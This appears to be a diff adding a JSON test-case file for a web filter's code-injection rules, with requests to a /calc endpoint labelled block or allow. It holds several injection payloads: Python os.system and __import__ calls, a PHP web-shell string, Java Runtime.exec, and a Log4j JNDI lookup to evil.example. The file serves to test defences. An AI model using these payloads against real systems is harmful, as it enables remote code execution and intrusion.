@@ -1,0 +1,13 @@
+{
+  "category": "codeinj",
+  "cases": [
+    {"name": "Python __import__ 执行", "location": "body", "expect": "block", "method": "POST", "path": "/calc", "body": "expr=__import__('os').system('whoami')", "content_type": "application/x-www-form-urlencoded"},
+    {"name": "Python eval", "location": "body", "expect": "block", "method": "POST", "path": "/calc", "body": "expr=eval(%221%2B1%22)", "content_type": "application/x-www-form-urlencoded"},
+    {"name": "Python os.system", "location": "body", "expect": "block", "method": "POST", "path": "/calc", "body": "expr=os.system('id')", "content_type": "application/x-www-form-urlencoded"},
+    {"name": "PHP system 写入", "location": "body", "expect": "block", "method": "POST", "path": "/calc", "body": "expr=%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%3F%3E", "content_type": "application/x-www-form-urlencoded"},
+    {"name": "Log4j JNDI 注入", "location": "header", "expect": "block", "path": "/calc", "headers": {"X-Api-Version": "${jndi:ldap://evil.example/a}"}},
+    {"name": "Java Runtime 执行", "location": "body", "expect": "block", "method": "POST", "path": "/calc", "body": "{\"cmd\":\"Runtime.getRuntime().exec('id')\"}", "content_type": "application/json"},
+    {"name": "Python subprocess", "location": "body", "expect": "block", "method": "POST", "path": "/calc", "body": "expr=subprocess.Popen(['id'])", "content_type": "application/x-www-form-urlencoded"},
+    {"name": "正常算式 1+1", "location": "body", "expect": "allow", "method": "POST", "path": "/calc", "body": "expr=1%2B1", "content_type": "application/x-www-form-urlencoded"}
+  ]
+}
